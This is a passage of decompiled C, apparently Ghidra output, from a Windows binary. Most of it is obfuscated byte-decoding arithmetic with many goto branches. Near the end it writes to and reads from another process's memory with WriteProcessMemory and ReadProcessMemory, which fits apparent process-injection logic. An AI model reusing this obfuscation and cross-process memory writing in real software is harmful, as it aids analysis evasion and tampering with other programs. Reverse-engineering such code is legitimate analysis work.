          bVar21 = ('-' - (cVar6 - 0xfU & bVar7)) * '\x02' + cVar6 + bVar7;
          goto LAB_14001fdf8;
        }
        if (uVar23 == uVar16 + 5) {
          bVar21 = ('7' - (cVar6 - 0x3dU & bVar7)) * '\x02' + cVar6 + bVar7;
          goto LAB_14001fe2a;
        }
        if (uVar23 != uVar16 + 8) goto LAB_14001f86f;
        bVar21 = cVar6 + (cVar6 + 0x67U & bVar7) * -2 + -0x6a + bVar7;
        uVar25 = uVar25 + (byte)local_448[uVar25 + 0x20] + uVar16 + 1;
      }
      goto LAB_14001f3e3;
    }
    cVar22 = cVar6 + (cVar6 - 0x29U & bVar7) * -2 + -10;
LAB_14001fd58:
    bVar21 = cVar22 + bVar7;
  }
  local_448[uVar25 + 0x20] = bVar7 + (bVar7 & cVar6 + 0x3fU) * -2 + 'G' + cVar6 + 0x3fU;
  uVar16 = uVar16 + 1;
  goto LAB_14001f3e3;
code_r0x000140019b9d:
  bVar7 = local_368[uVar23 + 0x40];
LAB_140019ba6:
  if (uVar23 < uVar17) {
    puVar14 = (undefined4 *)(auStackY_5f8 + 0x14e451f);
    goto LAB_14001a5c9;
  }
  cVar6 = (char)uVar23;
  if (uVar20 + 1 <= uVar17) {
    if (uVar17 != uVar20 + 1) {
      if (uVar17 != uVar20 + 3) {
        if (uVar17 != uVar20 + 4) {
          if (uVar17 != uVar20 + 5) {
            if (uVar17 != uVar20 + 2) {
              if (uVar17 != uVar20 + 7) goto LAB_140019c20;
              bVar21 = cVar6 - 0xf;
              cVar22 = '-';
              goto LAB_14001a40f;
            }
            bVar21 = cVar6 + 0x45;
            cVar22 = '1';
            goto LAB_14001a44e;
          }
          bVar21 = (bVar7 + cVar6 + 0x6fU + (cVar6 + 0x6fU & bVar7) * -2) - 9;
          goto LAB_14001a47c;
        }
        bVar21 = (bVar7 + cVar6 + 0x99U + (cVar6 + 0x99U & bVar7) * -2) - 0x2f;
        goto LAB_14001a4b0;
      }
      bVar21 = bVar7 + (cVar6 - 0x13U) + (cVar6 - 0x13U & bVar7) * -2 + 0x85;
      goto LAB_14001a4e1;
    }
    bVar21 = bVar7 + cVar6 + 0x41U + (cVar6 + 0x41U & bVar7) * -2 + 0x39;
    uVar23 = uVar23 + (byte)local_368[uVar23 + 0x40] + uVar20 + 1;
    goto LAB_140019b93;
  }
  bVar21 = bVar7 + (bVar7 & cVar6 + 0x6bU) * -2 + '\x13' + cVar6 + 0x6bU;
LAB_140019c20:
  if (uVar23 < uVar20) {
    puVar14 = (undefined4 *)(auStackY_5f8 + 0x15b22b4);
    goto LAB_14001a5c9;
  }
  if (uVar17 < uVar20 + 5) {
    bVar21 = ('+' - (cVar6 - 0x39U & bVar7)) * '\x02' + cVar6 + bVar7;
  }
  else {
    if (uVar17 == uVar20 + 1) {
      bVar21 = cVar6 + 0x9d;
      cVar22 = ')';
      goto LAB_14001a40f;
    }
    if (uVar17 == uVar20 + 2) {
      bVar21 = cVar6 + 0x49;
      cVar22 = '%';
      goto LAB_14001a44e;
    }
    if (uVar17 == uVar20 + 4) {
      bVar21 = ('!' - (cVar6 - 0xbU & bVar7)) * '\x02' + cVar6 + bVar7;
      goto LAB_14001a4b0;
    }
    if (uVar17 == uVar20 + 6) {
      bVar21 = ('\x1d' - (cVar6 + 0xa1U & bVar7)) * '\x02' + cVar6 + bVar7;
      goto LAB_14001a4e1;
    }
    if (uVar17 == uVar20 + 8) {
      bVar21 = ('\x19' - (cVar6 + 0x4dU & bVar7)) * '\x02' + cVar6 + bVar7;
      uVar23 = uVar23 + (byte)local_368[uVar23 + 0x40] + uVar20 + 1;
      goto LAB_140019b93;
    }
  }
  while( true ) {
    if (uVar17 + uVar20 <= uVar23) break;
    while( true ) {
      do {
        uVar16 = uVar20;
        uVar20 = uVar16;
        if (uVar17 == uVar16 + 0x40) {
          bVar21 = cVar6 - 6;
          cVar22 = '\x12';
          goto LAB_14001a40f;
        }
        if (uVar17 == uVar16 + 0x28) {
          bVar21 = ('\x10' - (cVar6 - 0x30U & bVar7)) * '\x02' + cVar6 + bVar7;
          uVar20 = uVar16 + 1;
          goto LAB_140019b93;
        }
        if (uVar17 == uVar16 + 0x20) {
          bVar21 = cVar6 + 0xa6;
          cVar22 = '\x0e';
          goto LAB_14001a44e;
        }
        if (uVar17 == uVar16 + 1) {
          bVar21 = ('\f' - (cVar6 + 0x7cU & bVar7)) * '\x02' + cVar6 + bVar7;
          goto LAB_14001a47c;
        }
        if (uVar17 == uVar16 + 0x2a) {
          bVar21 = ('\n' - (cVar6 + 0x52U & bVar7)) * '\x02' + cVar6 + bVar7;
          goto LAB_14001a4b0;
        }
        if (uVar17 == uVar16 + 0x5a) {
          bVar21 = ('\b' - (cVar6 + 0x28U & bVar7)) * '\x02' + cVar6 + bVar7;
          goto LAB_14001a4b3;
        }
        uVar25 = uVar16 + 0x42;
        if (uVar17 == uVar25) {
          bVar21 = ('\x06' - (cVar6 - 2U & bVar7)) * '\x02' + cVar6 + bVar7;
          goto LAB_14001a4e1;
        }
      } while (uVar17 == uVar16 + 2);
      uVar20 = uVar16 + 0x43;
      if (uVar25 < uVar16 + 0x83) {
        bVar21 = ('=' - (cVar6 - 0x3fU & bVar7)) * '\x02' + cVar6 + bVar7;
        goto LAB_140019b82;
      }
      uVar17 = uVar25;
      if (uVar25 < uVar16 + 0x46) {
        bVar21 = (';' - (cVar6 + 0x97U & bVar7)) * '\x02' + cVar6 + bVar7;
        goto LAB_140019b90;
      }
      if (uVar25 < uVar16 + 0x45) {
        bVar21 = bVar7 + cVar6 + 0x6dU + (cVar6 + 0x6dU & bVar7) * -2 + 5;
        goto LAB_140019ba6;
      }
      if (uVar25 < uVar16 + 0x44) {
        bVar21 = ('7' - (cVar6 + 0x43U & bVar7)) * '\x02' + cVar6 + bVar7;
        goto LAB_140019c20;
      }
      if (uVar25 < uVar16 + 0xc3) break;
      if (uVar25 < uVar16 + 0xa7) {
        bVar21 = cVar6 - 0x11;
        cVar22 = '3';
        goto LAB_140019fa7;
      }
      uVar17 = uVar16 + 0x85;
      if (uVar25 < uVar17) {
        bVar21 = cVar6 - 0x3b;
        cVar22 = '1';
        uVar17 = uVar25;
        goto LAB_140019f6c;
      }
      if (uVar25 < uVar16 + 0x47) {
        bVar21 = cVar6 + 0x9b;
        cVar22 = '/';
        uVar17 = uVar25;
        goto LAB_140019f2e;
      }
      uVar20 = uVar16 + 0x285;
      if (uVar16 + 0x289 < uVar17) {
        bVar21 = cVar6 + (cVar6 + 0x88U & bVar7) * -2 + -0x30 + bVar7;
        uVar23 = uVar23 + (byte)local_368[uVar23 + 0x40] + uVar20 + 1;
        goto LAB_140019b93;
      }
      if (uVar16 + 0x288 < uVar17) {
        bVar21 = cVar6 + (cVar6 + 0x5eU & bVar7) * -2 + -0x34 + bVar7;
        goto LAB_14001a507;
      }
      if (uVar16 + 0x287 < uVar17) {
        bVar21 = cVar6 + (cVar6 + 0x34U & bVar7) * -2 + -0x38 + bVar7;
        goto LAB_14001a4e1;
      }
      if (uVar16 + 0x485 < uVar17) {
        bVar21 = cVar6 + (cVar6 + 10U & bVar7) * -2 + -0x3c + bVar7;
        goto LAB_14001a4b3;
      }
      if (uVar16 + 0x305 < uVar17) {
        bVar21 = cVar6 + (cVar6 - 0x20U & bVar7) * -2 + -0x40 + bVar7;
        goto LAB_14001a4b0;
      }
      if (uVar16 + 0x2e9 < uVar17) {
        bVar21 = cVar6 + (cVar6 + 0xb6U & bVar7) * -2 + -0x44 + bVar7;
        goto LAB_14001a47c;
      }
      if (uVar16 + 0x28a < uVar17) {
        bVar21 = cVar6 + (cVar6 + 0x8cU & bVar7) * -2 + -0x48 + bVar7;
        goto LAB_140019b93;
      }
      if (uVar17 <= uVar16 + 0x66d) {
        uVar17 = uVar16 + 0x28a;
        uVar20 = uVar16 + 0x48a;
      }
    }
    bVar21 = ('5' - (cVar6 + 0x19U & bVar7)) * '\x02' + cVar6 + bVar7;
  }
  if (uVar17 < uVar20 + 1000) {
    bVar21 = cVar6 + 0x6b;
    cVar22 = '?';
LAB_140019fa7:
    bVar21 = (cVar22 - (bVar21 & bVar7)) * '\x02' + cVar6 + bVar7;
LAB_140019fb3:
    if (uVar17 + uVar20 == 0x400) {
      bVar21 = ('\x16' - (cVar6 + 0x4eU & bVar7)) * '\x02' + cVar6;
      goto LAB_14001a4e1;
    }
    if (uVar20 + 0x7a < uVar17) {
      bVar21 = cVar6 + 0x7f;
      cVar22 = '\x03';
LAB_140019f6c:
      bVar21 = (cVar22 - (bVar21 & bVar7)) * '\x02' + cVar6 + bVar7;
    }
    else {
      if (uVar17 == uVar20 + 1) {
        bVar21 = cVar6 + 0x55;
        cVar22 = '\x01';
LAB_14001a40f:
        bVar21 = (cVar22 - (bVar21 & bVar7)) * '\x02' + cVar6 + bVar7;
        goto LAB_14001a41d;
      }
      if (uVar17 == uVar20 + 2) {
        bVar21 = cVar6 + (cVar6 + 1U & bVar7) * -2 + -6 + bVar7;
        goto LAB_140019b93;
      }
      if (uVar17 == uVar20 + 3) {
        bVar21 = cVar6 + (cVar6 - 0x29U & bVar7) * -2 + -10 + bVar7;
        goto LAB_14001a47c;
      }
      if (uVar17 == uVar20 + 5) {
        bVar21 = cVar6 + (cVar6 + 0xadU & bVar7) * -2 + -0xe + bVar7;
        goto LAB_14001a4b0;
      }
      if (uVar17 == uVar20 + 6) {
        bVar21 = cVar6 + (cVar6 + 0x83U & bVar7) * -2 + -0x12 + bVar7;
        goto LAB_14001a4b3;
      }
      if (uVar17 == uVar20 + 4) {
        bVar21 = cVar6 + (cVar6 + 0x59U & bVar7) * -2 + -0x16 + bVar7;
        goto LAB_14001a4e1;
      }
    }
    if (uVar17 < 0x10) {
      if (uVar20 + 0x7a < uVar17) {
        bVar21 = cVar6 + 0x46;
        cVar22 = '.';
LAB_140019f2e:
        bVar21 = (cVar22 - (bVar21 & bVar7)) * '\x02' + cVar6 + bVar7;
      }
      else {
        if (uVar17 == uVar20 + 1) {
          bVar21 = (',' - (cVar6 + 0x1cU & bVar7)) * '\x02' + cVar6 + bVar7;
          uVar23 = uVar23 + (byte)local_368[uVar23 + 0x40] + uVar20 + 1;
          goto LAB_140019b93;
        }
        if (uVar17 == uVar20 + 2) {
          bVar21 = ('(' - (cVar6 - 0x38U & bVar7)) * '\x02' + cVar6 + bVar7;
LAB_14001a4e1:
          bVar11 = cVar6 + 0xb9U + (cVar6 + 0xb9U & bVar7) * -2 + -0xf + bVar7;
          local_368[uVar23 + 0x40] = bVar11;
          uVar20 = uVar20 + 1;
          uVar23 = uVar23 - (bVar11 + uVar20);
LAB_14001a507:
          bVar11 = (char)uVar23 + 0x24;
          local_368[uVar23 + 0x40] = ('\x02' - (bVar11 & bVar7)) * '\x02' + bVar11 + bVar7;
          uVar17 = uVar17 + 1;
          lVar24 = uVar23 + (-1 - uVar17);
          uVar23 = lVar24 + (byte)local_368[lVar24 + 0x40] + uVar20 + 1;
          goto LAB_140019b93;
        }
        if (uVar17 == uVar20 + 3) {
          bVar21 = ('&' - (cVar6 + 0x9eU & bVar7)) * '\x02' + cVar6 + bVar7;
          goto LAB_14001a4b3;
        }
        if (uVar17 == uVar20 + 6) {
          bVar21 = ('\"' - (cVar6 + 0x4aU & bVar7)) * '\x02' + cVar6 + bVar7;
          goto LAB_14001a47c;
        }
        if (uVar17 == uVar20 + 4) {
          bVar21 = cVar6 + 0x20;
          cVar22 = ' ';
LAB_14001a44e:
          bVar21 = (cVar22 - (bVar21 & bVar7)) * '\x02' + cVar6 + bVar7;
          goto LAB_140019b93;
        }
      }
      if (uVar20 < 0x10) {
        local_368[uVar23 + 0x40] = bVar21;
        uVar23 = uVar23 + 1;
        goto LAB_140019b93;
      }
      bVar21 = (('\x1a' - (cVar6 + 0xa2U & bVar7)) * '\x02' + cVar6 + bVar7) * '\x02';
LAB_14001a41d:
      local_368[uVar23 + 0x40] = cVar6 + 0xdU + (cVar6 + 0xdU & bVar7) * -2 + -0x5b + bVar7;
      uVar20 = uVar20 + 1;
      goto LAB_140019b93;
    }
    bVar21 = ('\x18' - (cVar6 + 0x78U & bVar7)) * '\x02' + cVar6 + bVar7 * '\x02';
LAB_14001a47c:
    local_368[uVar23 + 0x40] =
         (cVar6 - 0x1dU) + (cVar6 - 0x1dU & bVar7) * -2 + -0x35 + bVar21 + bVar7;
  }
  else {
    if (uVar17 == uVar20 + 1) {
      bVar21 = cVar6 + (cVar6 + 0x8eU & bVar7) * -2 + -0x54 + bVar7;
      uVar23 = uVar23 + (byte)local_368[uVar23 + 0x40] + uVar20 + 1;
      goto LAB_140019b93;
    }
    if (uVar17 == uVar20 + 2) {
      bVar21 = cVar6 + (cVar6 + 0x3aU & bVar7) * -2 + -0x5c + bVar7;
      goto LAB_14001a4e1;
    }
    if (uVar17 != uVar20 + 5) {
      if (uVar17 != uVar20 + 3) {
        if (uVar17 == uVar20 + 7) {
          bVar21 = cVar6 + (cVar6 + 0x92U & bVar7) * -2 + -0x6c + bVar7;
          goto LAB_140019b93;
        }
        if (uVar17 == uVar20 + 2) {
          bVar21 = cVar6 + (cVar6 + 0x68U & bVar7) * -2 + -0x70 + bVar7;
          uVar20 = uVar20 + 1;
          goto LAB_140019b93;
        }
        goto LAB_140019fb3;
      }
      bVar21 = cVar6 + (cVar6 + 0xbcU & bVar7) * -2 + -0x68 + bVar7;
      goto LAB_14001a47c;
    }
    bVar21 = cVar6 + (cVar6 - 0x1aU & bVar7) * -2 + -100 + bVar7;
  }
LAB_14001a4b0:
  uVar17 = uVar17 + uVar20;
LAB_14001a4b3:
  uVar23 = uVar23 - bVar21;
  goto LAB_140019b93;
LAB_1400215dc:
  WriteProcessMemory(hProcess,local_198,local_68,lStack_60 - (longlong)local_68,(SIZE_T *)0x0);
  cVar6 = FUN_14000fc90(param_1,local_198);
  if (cVar6 == '\0') {
LAB_140022c6e:
    uVar9 = 0;
LAB_140022c70:
    FUN_140025000(local_1b8);
    FUN_14000e3a0(&local_68);
    goto LAB_140022c8d;
  }
  local_70 = 0;
  ReadProcessMemory(local_78,(LPCVOID)((longlong)lpBaseAddress + 0x108),&local_70,8,(SIZE_T *)0x0);
  lVar24 = local_70;
  local_3a8 = 0x5f47555b;
  local_3a4 = 0x4355465c;
  local_3a0 = 0xa541;
  local_39e = 0;
  local_396 = 0;
  bVar21 = local_5c8;
LAB_140021690:
  uVar20 = DAT_140a618c8;
  uVar17 = DAT_140a618d0;
LAB_1400216a0:
  uVar16 = 0;
  uVar23 = uVar17;
LAB_1400216a3:
  if (0x13 < uVar16) {
    puVar14 = &local_3a8;
LAB_1400220e6:
    cVar6 = FUN_140025080(local_1b8,puVar14);
    if (cVar6 != '\0') {
      FUN_1400383d0(&local_78,local_198);
    }
    local_388 = 0xb3b435b6;
    local_384 = 0;
    uStack_37c = 0;
    local_374 = 0;
    local_372 = 0;
LAB_140022140:
    uVar17 = DAT_140a618c8;
    uVar20 = DAT_140a618d0;
LAB_140022150:
    uVar16 = 0;
    uVar23 = uVar20;
LAB_140022153:
    if (uVar16 < 0x17) {
      bVar21 = local_368[uVar16 - 0x20];
LAB_140022166:
      if (uVar16 < uVar17) goto LAB_140022c56;
      cVar6 = (char)uVar16;
      if (uVar23 + 1 <= uVar17) {
        if (uVar17 != uVar23 + 1) {
          if (uVar17 == uVar23 + 2) {
            local_5c8 = bVar21 + cVar6 + 0x5fU + (cVar6 + 0x5fU & bVar21) * -2 + 0x67;
            goto LAB_140022b75;
          }
          if (uVar17 == uVar23 + 2) {
            local_5c8 = bVar21 + cVar6 + 0x31U + (cVar6 + 0x31U & bVar21) * -2 + 0xa9;
            goto LAB_140022b47;
          }
          if (uVar17 == uVar23 + 4) {
            local_5c8 = (bVar21 + cVar6 + 3U + (cVar6 + 3U & bVar21) * -2) - 0x15;
            uVar17 = uVar17 + uVar23;
            goto LAB_140022b47;
          }
          if (uVar17 == uVar23 + 3) {
            local_5c8 = bVar21 + (cVar6 - 0x2bU) + (cVar6 - 0x2bU & bVar21) * -2 + 0x2d;
            goto LAB_140022af3;
          }
          if (uVar17 != uVar23 + 5) {
            if (uVar17 != uVar23 + 8) goto LAB_1400221f0;
            bVar7 = cVar6 + 0x4b;
            cVar22 = '\x1f';
            goto LAB_140022a82;
          }
          bVar7 = cVar6 + 0xa7;
          cVar22 = '\v';
          goto LAB_140022ac4;
        }
        local_5c8 = (cVar6 + 0xbbU + bVar21 + (bVar21 & cVar6 + 0xbbU) * -2) - 0x1d;
        uVar16 = uVar16 + (byte)local_368[uVar16 - 0x20] + uVar23 + 1;
        goto LAB_140022153;
      }
      local_5c8 = bVar21 + (bVar21 & cVar6 - 0x17U) * -2 + -0x5f + (cVar6 - 0x17U);
LAB_1400221f0:
      if (uVar16 < uVar23) {
        in_stack_00e465ed = in_stack_0153e904;
        goto LAB_140022c56;
      }
      if (uVar17 < uVar23 + 0x42) {
        local_5c8 = (')' - (cVar6 + 0x1dU & bVar21)) * '\x02' + bVar21 + cVar6;
      }
      else {
        if (uVar17 == uVar23 + 1) {
          bVar7 = cVar6 - 0x11;
          cVar22 = '3';
          goto LAB_140022a82;
        }
        if (uVar17 == uVar23 + 2) {
          local_5c8 = cVar6 + bVar21 + (cVar6 + 0x93U & bVar21) * -2 + 0x8e;
          goto LAB_140022153;
        }
        if (uVar17 == uVar23 + 3) {
          local_5c8 = cVar6 + bVar21 + (cVar6 + 0x37U & bVar21) * -2 + 0xb6;
          uVar17 = uVar17 + uVar23;
          goto LAB_140022b47;
        }
        if (uVar17 == uVar23 + 5) {
          local_5c8 = (cVar6 + bVar21 + (cVar6 + 9U & bVar21) * -2) - 0x36;
          goto LAB_140022b47;
        }
        if (uVar17 == uVar23 + 4) {
          local_5c8 = bVar21 + (cVar6 + 0xadU & bVar21) * -2 + -0xe + cVar6;
          goto LAB_140022ba1;
        }
        if (uVar17 == uVar23 + 9) {
          local_5c8 = ('\x03' - (cVar6 + 0x7fU & bVar21)) * '\x02' + bVar21 + cVar6;
          uVar16 = uVar16 + (byte)local_368[uVar16 - 0x20] + uVar23 + 1;
          goto LAB_140022153;
        }
      }
      while( true ) {
        uVar20 = uVar23;
        if (uVar23 + uVar17 <= uVar16) break;
        while( true ) {
          do {
            uVar23 = uVar20;
            if (uVar17 == uVar23 + 2) {
              bVar7 = cVar6 + 0x1e;
              cVar22 = '&';
              goto LAB_140022a82;
            }
            if (uVar17 == uVar23 + 6) {
              local_5c8 = ('0' - (cVar6 - 0x10U & bVar21)) * '\x02' + bVar21 + cVar6;
              uVar23 = uVar23 + 1;
              goto LAB_140022153;
            }
            if (uVar17 == uVar23 + 0x10) {
              bVar7 = cVar6 - 0x3e;
              cVar22 = ':';
              goto LAB_140022ac4;
            }
            if (uVar17 == uVar23 + 0x42) {
              local_5c8 = bVar21 + (cVar6 + 0x94U & bVar21) * -2 + -0x78 + cVar6;
              goto LAB_140022af3;
            }
            if (uVar17 == uVar23 + 10) {
              local_5c8 = cVar6 + bVar21 + (cVar6 + 0x66U & bVar21) * -2 + 0x9c;
              uVar17 = uVar17 + uVar23;
              goto LAB_140022b47;
            }
            if (uVar17 == uVar23 + 0x40) {
              local_5c8 = cVar6 + bVar21 + (cVar6 + 0x38U & bVar21) * -2 + 0xb0;
              goto LAB_140022b47;
            }
            if (uVar17 == uVar23 + 0x200) {
              local_5c8 = bVar21 + (cVar6 + 10U & bVar21) * -2 + -0x3c + cVar6;
              goto LAB_140022b75;
            }
            if (uVar17 == uVar23 + 0x61) {
              local_5c8 = bVar21 + (cVar6 - 0x24U & bVar21) * -2 + -0x28 + cVar6;
              goto LAB_140022ba1;
            }
            if (uVar17 == uVar23 + 0x2a) {
              local_5c8 = (cVar6 + bVar21 + (cVar6 + 0xaeU & bVar21) * -2) - 0x14;
              uVar16 = uVar16 + (byte)local_368[uVar16 - 0x20] + uVar23 + 1;
              goto LAB_140022153;
            }
            uVar20 = uVar23;
          } while (uVar17 == uVar23 + 0x1000);
          uVar17 = uVar23 + 0x7a;
          uVar20 = uVar23 + 0xd4;
          if (uVar17 < uVar23 + 0xd5) {
            local_5c8 = cVar6 + bVar21 + (cVar6 + 0x3bU & bVar21) * -2 + 0x9e;
            goto LAB_140022140;
          }
          if (uVar17 < uVar23 + 0xd9) {
            local_5c8 = cVar6 + bVar21 + (cVar6 + 0xdU & bVar21) * -2 + 0xb2;
            goto LAB_140022150;
          }
          if (uVar17 < uVar23 + 0xde) {
            local_5c8 = bVar21 + (cVar6 - 0x21U & bVar21) * -2 + -0x3a + cVar6;
            uVar23 = uVar20;
            goto LAB_140022166;
          }
          if (uVar17 < uVar23 + 0xd8) {
            local_5c8 = bVar21 + (cVar6 + 0xb1U & bVar21) * -2 + -0x26 + cVar6;
            uVar23 = uVar20;
            goto LAB_1400221f0;
          }
          if (uVar17 < uVar23 + 0xdd) break;
          if (uVar17 < uVar23 + 0xfc) {
            cVar22 = ('\x01' - (cVar6 + 0x55U & bVar21)) * '\x02' + bVar21;
            uVar23 = uVar20;
            goto LAB_140022636;
          }
          if (uVar17 < uVar23 + 0x154) {
            cVar22 = ('\v' - (cVar6 + 0x27U & bVar21)) * '\x02' + bVar21;
            uVar23 = uVar20;
            goto LAB_1400225fb;
          }
          if (uVar17 < uVar23 + 0xf4) {
            bVar7 = cVar6 - 7;
            cVar22 = '\x15';
            uVar23 = uVar20;
            goto LAB_1400225b5;
          }
          if (uVar17 < uVar23 + 0x138) {
            local_5c8 = ('\x1f' - (cVar6 - 0x35U & bVar21)) * '\x02' + bVar21 + cVar6;
            uVar23 = uVar20;
            goto LAB_14002259a;
          }
          if (uVar23 + 0x4d4 <= uVar17) {
            uVar17 = uVar23 + 0x135;
            uVar20 = uVar23 + 0x176;
            if (uVar23 + 0x1a0 < uVar17) {
              local_5c8 = (cVar6 + bVar21 + (cVar6 + 0x58U & bVar21) * -2) - 0x10;
              uVar16 = uVar16 + (byte)local_368[uVar16 - 0x20] + uVar20 + 1;
              uVar23 = uVar20;
              goto LAB_140022153;
            }
            if (uVar23 + 0x1176 < uVar17) {
              local_5c8 = ('\x02' - (cVar6 + 0x2aU & bVar21)) * '\x02' + bVar21 + cVar6;
              uVar23 = uVar20;
              goto LAB_140022ba1;
            }
            if (uVar23 + 0x1d0 < uVar17) {
              local_5c8 = ('\f' - (cVar6 - 4U & bVar21)) * '\x02' + bVar21 + cVar6;
              uVar23 = uVar20;
              goto LAB_140022b75;
            }
            if (uVar23 + 0x179 < uVar17) {
              local_5c8 = ('\x16' - (cVar6 - 0x32U & bVar21)) * '\x02' + bVar21 + cVar6;
              uVar23 = uVar20;
              goto LAB_140022b47;
            }
            if (uVar23 + 0x17e < uVar17) {
              local_5c8 = (' ' - (cVar6 + 0xa0U & bVar21)) * '\x02' + bVar21 + cVar6;
              uVar17 = uVar17 + uVar20;
              uVar23 = uVar20;
              goto LAB_140022b47;
            }
            if (uVar23 + 0x196 < uVar17) {
              local_5c8 = ('*' - (cVar6 + 0x72U & bVar21)) * '\x02' + bVar21 + cVar6;
              uVar23 = uVar20;
              goto LAB_140022af3;
            }
            if (uVar23 + 0x17c < uVar17) {
              bVar7 = cVar6 + 0x44;
              cVar22 = '4';
              uVar23 = uVar20;
              goto LAB_140022ac4;
            }
            if (uVar23 + 0x186 < uVar17) {
              local_5c8 = ('>' - (cVar6 + 0x16U & bVar21)) * '\x02' + bVar21 + cVar6;
              uVar23 = uVar23 + 0x177;
              goto LAB_140022153;
            }
            if (uVar23 + 0x1b8 < uVar17) {
              cVar22 = bVar21 + (cVar6 - 0x18U & bVar21) * -2 + -0x70;
              uVar23 = uVar20;
              goto LAB_140022a8e;
            }
            if (uVar17 <= uVar23 + 0x55e) {
              uVar17 = uVar23 + 0x1176;
              uVar20 = uVar23 + 0x11b6;
            }
          }
        }
        local_5c8 = bVar21 + (cVar6 + 0x83U & bVar21) * -2 + -0x12 + cVar6;
        uVar23 = uVar20;
      }
      if (uVar23 + 0x20 <= uVar17) {
        if (uVar17 == uVar23 + 1) {
          local_5c8 = cVar6 + bVar21 + (cVar6 + 0x3aU & bVar21) * -2 + 0xa4;
          uVar16 = uVar16 + (byte)local_368[uVar16 - 0x20] + uVar23 + 1;
          goto LAB_140022153;
        }
        if (uVar17 == uVar23 + 2) {
          local_5c8 = bVar21 + (cVar6 - 0x22U & bVar21) * -2 + -0x34 + cVar6;
          goto LAB_140022b75;
        }
        if (uVar17 == uVar23 + 2) {
          local_5c8 = (cVar6 + bVar21 + (cVar6 + 0x82U & bVar21) * -2) - 0xc;
          uVar17 = uVar17 + uVar23;
          goto LAB_140022b47;
        }
        if (uVar17 == uVar23 + 4) {
          bVar7 = cVar6 + 0x26;
          cVar22 = '\x0e';
          goto LAB_140022ac4;
        }
        if (uVar17 != uVar23 + 3) goto LAB_140022639;
        bVar7 = cVar6 - 0x36;
        cVar22 = '\"';
LAB_140022a82:
        cVar22 = (cVar22 - (bVar7 & bVar21)) * '\x02' + bVar21;
LAB_140022a8e:
        local_5c8 = cVar22 + cVar6;
        goto LAB_140022a91;
      }
      cVar22 = bVar21 + (cVar6 - 0x17U & bVar21) * -2 + -0x76;
LAB_140022636:
      local_5c8 = cVar22 + cVar6;
LAB_140022639:
      if (uVar23 + uVar17 == 6) {
        local_5c8 = ('\x12' - (cVar6 + 0x7aU & bVar21)) * '\x02' + cVar6;
        goto LAB_140022b75;
      }
      if (uVar23 + 9 < uVar17) {
        cVar22 = bVar21 + (cVar6 + 0x85U & bVar21) * -2 + -0x1e;
LAB_1400225fb:
        local_5c8 = cVar22 + cVar6;
      }
      else {
        if (uVar17 == uVar23 + 1) {
          cVar22 = bVar21 + (cVar6 + 0x57U & bVar21) * -2 + -10;
          goto LAB_140022a8e;
        }
        if (uVar17 == uVar23 + 3) {
          bVar7 = cVar6 - 5;
          cVar22 = '\x0f';
LAB_140022ac4:
          local_5c8 = (cVar22 - (bVar7 & bVar21)) * '\x02' + bVar21 + cVar6;
          goto LAB_140022153;
        }
        if (uVar17 == uVar23 + 5) {
          local_5c8 = ('#' - (cVar6 + 0x9fU & bVar21)) * '\x02' + bVar21 + cVar6;
          uVar17 = uVar17 + uVar23;
          goto LAB_140022b47;
        }
        if (uVar17 == uVar23 + 7) {
          local_5c8 = ('7' - (cVar6 + 0x43U & bVar21)) * '\x02' + bVar21 + cVar6;
          goto LAB_140022b75;
        }
        if (uVar17 == uVar23 + 2) {
          local_5c8 = cVar6 + bVar21 + (cVar6 - 0x19U & bVar21) * -2 + 0x96;
          uVar16 = uVar16 + (byte)local_368[uVar16 - 0x20] + uVar23 + 1;
          goto LAB_140022153;
        }
      }
      if (4 < uVar17) {
        local_5c8 = ((bVar21 - (cVar6 + 0xa8U & bVar21)) + '\b') * '\x02' + cVar6;
LAB_140022af3:
        local_368[uVar16 - 0x20] =
             bVar21 + (bVar21 & cVar6 + 0x91U) * -2 + '\t' + cVar6 + 0x91U + local_5c8;
        uVar17 = uVar17 + uVar23;
LAB_140022b47:
        uVar16 = uVar16 - local_5c8;
        goto LAB_140022153;
      }
      if (uVar23 + 0x41 < uVar17) {
        bVar7 = cVar6 + 0xa2;
        cVar22 = '\x1a';
LAB_1400225b5:
        local_5c8 = (cVar22 - (bVar7 & bVar21)) * '\x02' + bVar21 + cVar6;
      }
      else {
        if (uVar17 == uVar23 + 1) {
          local_5c8 = ('$' - (cVar6 + 0x74U & bVar21)) * '\x02' + bVar21 + cVar6;
          uVar16 = uVar16 + (byte)local_368[uVar16 - 0x20] + uVar23 + 1;
          goto LAB_140022153;
        }
        if (uVar17 == uVar23 + 2) {
          local_5c8 = ('8' - (cVar6 + 0x18U & bVar21)) * '\x02' + bVar21 + cVar6;
LAB_140022b75:
          bVar7 = bVar21 + (bVar21 & cVar6 + 99U) * -2 + 'K' + cVar6 + 99U;
          local_368[uVar16 - 0x20] = bVar7;
          uVar16 = uVar16 - ((ulonglong)bVar7 + uVar23 + 1);
          uVar23 = uVar23 + 1;
LAB_140022ba1:
          bVar7 = (char)uVar16 + 0x4c;
          local_368[uVar16 - 0x20] = bVar7 + (bVar7 & bVar21) * -2 + -0x14 + bVar21;
          uVar17 = uVar17 + 1;
          lVar15 = uVar16 + (-1 - uVar17);
          uVar16 = lVar15 + (byte)local_368[lVar15 + -0x20] + uVar23 + 1;
          goto LAB_140022153;
        }
        if (uVar17 == uVar23 + 3) {
          local_5c8 = cVar6 + bVar21 + (cVar6 - 0x16U & bVar21) * -2 + 0x84;
          goto LAB_140022b47;
        }
        if (uVar17 == uVar23 + 5) {
          local_5c8 = bVar21 + (cVar6 + 0x8eU & bVar21) * -2 + -0x54 + cVar6;
          goto LAB_140022af3;
        }
        if (uVar17 == uVar23 + 2) {
          local_5c8 = (cVar6 + bVar21 + (cVar6 + 0x60U & bVar21) * -2) - 0x40;
          goto LAB_140022153;
        }
      }
      if (uVar23 < 0x1000) {
LAB_14002259a:
        local_368[uVar16 - 0x20] = local_5c8;
        uVar16 = uVar16 + 1;
        goto LAB_140022153;
      }
      local_5c8 = (bVar21 + (cVar6 - 0x2aU & bVar21) * -2 + cVar6) * '\x02' - 8;
LAB_140022a91:
      local_368[uVar16 - 0x20] = bVar21 + (bVar21 & cVar6 + 0xbfU) * -2 + -0x39 + cVar6 + 0xbfU;
      uVar23 = uVar23 + 1;
      goto LAB_140022153;
    }
    in_stack_00e465ed = local_388;
LAB_140022c56:
    VirtualFreeEx(hProcess,lpBaseAddress,0,in_stack_00e465ed);
    if (lVar24 == 0) goto LAB_140022c6e;
    uVar9 = 1;
    goto LAB_140022c70;
  }
  bVar7 = local_368[uVar16 - 0x40];
  cVar6 = (char)uVar16;
LAB_1400216c0:
  if (uVar16 < uVar20) {
